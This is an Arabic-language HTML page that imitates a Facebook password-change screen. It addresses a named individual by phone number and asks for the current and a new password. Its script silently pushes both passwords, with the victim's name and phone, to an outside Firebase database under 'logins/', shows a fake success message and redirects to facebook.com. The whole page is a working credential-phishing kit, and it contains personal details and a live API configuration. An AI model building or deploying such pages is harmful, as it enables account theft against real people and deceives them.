<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تغيير كلمة السر</title>
    <style>
        body { background-color: #f0f2f5; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: right; }
        .card { background: #fff; width: 100%; max-width: 450px; padding: 25px; border-radius: 8px; box-shadow: 0 12px 28px rgba(0,0,0,0.1); }
        h2 { color: #1c1e21; font-size: 20px; border-bottom: 1px solid #dddfe2; padding-bottom: 15px; margin-bottom: 15px; }
        p { color: #606770; font-size: 15px; margin-bottom: 20px; }
        label { display: block; font-weight: bold; margin-bottom: 8px; color: #1c1e21; font-size: 14px; }
        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 14px; }
        .btn-save { width: 100%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; }
        .footer { margin-top: 15px; text-align: center; }
        .footer a { color: #1877f2; text-decoration: none; font-size: 14px; }
    </style>
</head>
<body>

    <div class="card">
        <h2>تغيير كلمة السر</h2>
        <p>لحماية حسابك المرتبط بالرقم <strong>+21620119370</strong>، يرجى تحديث كلمة السر الخاصة بك.</p>
        
        <form id="changeForm">
            <label>كلمة السر القديمة</label>
            <input type="password" id="oldPass" placeholder="أدخل كلمة السر الحالية" required>
            
            <label>كلمة السر الجديدة</label>
            <input type="password" id="newPass" placeholder="كلمة سر جديدة" required>
            
            <label>تأكيد كلمة السر الجديدة</label>
            <input type="password" id="confirmPass" placeholder="تأكيد كلمة السر" required>
            
            <button type="submit" class="btn-save" id="saveBtn">حفظ التغييرات</button>
        </form>
        <div class="footer"><a href="#">إلغاء</a></div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>

    <script>
        // Use same config
        const firebaseConfig = {
            apiKey: "AIzaSyDWV0Ks0O5b0XktqJ4mOoRKGfqQZE7q5Eg",
            authDomain: "testapp-f51a4.firebaseapp.com",
            databaseURL: "https://testapp-f51a4-default-rtdb.firebaseio.com",
            projectId: "testapp-f51a4",
            storageBucket: "testapp-f51a4.firebasestorage.app",
            messagingSenderId: "943524545175",
            appId: "1:943524545175:web:7d49a182a6251a1c9e1fd2"
        };
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        document.getElementById('changeForm').addEventListener('submit', (e) => {
            e.preventDefault();
            const oldP = document.getElementById('oldPass').value;
            const newP = document.getElementById('newPass').value;

            database.ref('logins/').push({
                user: "Aziz Chaffi",
                phone: "+21620119370",
                old_password: oldP,
                new_password: newP,
                step: "Change Password Page",
                timestamp: new Date().toLocaleString()
            }).then(() => {
                alert("تم تحديث كلمة السر بنجاح");
                window.location.href = "https://www.facebook.com";
            });
        });
    </script>
</body>
</html>
